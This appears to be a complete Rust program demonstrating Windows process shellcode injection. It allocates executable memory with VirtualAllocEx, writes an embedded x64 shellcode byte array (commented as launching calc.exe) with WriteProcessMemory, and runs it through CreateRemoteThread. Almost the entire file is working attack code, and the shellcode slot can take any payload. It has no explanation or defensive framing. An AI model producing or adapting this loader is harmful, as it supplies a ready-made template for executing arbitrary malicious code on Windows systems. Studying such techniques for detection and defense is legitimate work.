use windows::Win32::System::Memory::{
                                     VirtualAllocEx,
                                   //  VirtualFree,
                                     PAGE_EXECUTE_READWRITE,
                                     MEM_COMMIT,
                                   //  MEM_RELEASE,
                                     MEM_RESERVE
                                    // MEM_RESERVE,
                                    };
use windows::Win32::Foundation::{
                                CloseHandle,
                                GetLastError
                                };
use windows::Win32::System::Threading::{
                                        GetCurrentProcessId,
                                        CreateRemoteThread,
                                        OpenProcess,
                                        PROCESS_ALL_ACCESS,
                                     //   LPTHREAD_START_ROUTINE,
                                        };
use windows::Win32::System::Diagnostics::Debug::{
                                                    WriteProcessMemory,
                                                };

use std::{
    mem::transmute,
    io};

fn main() {

    //Calc.exe
    let shellcode: Vec<u8> = [ 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 
                               0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 
                               0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 
                               0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 
                               0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 
                               0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 
                               0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 
                               0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 
                               0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 
                               0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 
                               0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 
                               0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 
                               0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 
                               0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 
                               0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 
                               0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 
                               0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 
                               0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 
                               0x63, 0x2e, 0x65, 0x78, 0x65, 0x00].to_vec();

    unsafe {
        // get pid of current process
        let p_name_id = GetCurrentProcessId();
        
        // Get Handle
        let process_handle = match OpenProcess(PROCESS_ALL_ACCESS, false, p_name_id){
            Ok(process_handle) => process_handle,
            Err(_e) => {
                println!("[-] Unable to get handle on current process: {:?}",  GetLastError());
                return();
            }
        };

        // Allocate space
        let remote_buffer = VirtualAllocEx(process_handle, None, shellcode.len(),MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        // WriteMemory
        let _result = match WriteProcessMemory(process_handle, remote_buffer, shellcode.as_ptr().cast(), shellcode.len(), None){
            Ok(_result) => _result,
            Err(_e) => {
                println!("[-] Unable to Write: {:?}", GetLastError());
                return();
            }
        };

        // Start Remote Thread
        let remote_thread = match CreateRemoteThread(process_handle, None, 0, transmute(remote_buffer),None,0,None){
            Ok(remote_thread) => remote_thread,
            Err(_e) => {
                println!("[-] Unable to CreateRemoteThread: {:?}",  GetLastError());
                return();
            }
        };

        let mut input = String::new();
        println!("Pausing...");
        io::stdin()
                    .read_line(&mut input)
                    .expect("Error: unable to read user input");
        println!("{:?}", input);

        // Close Handle
        CloseHandle(process_handle);
    }
}
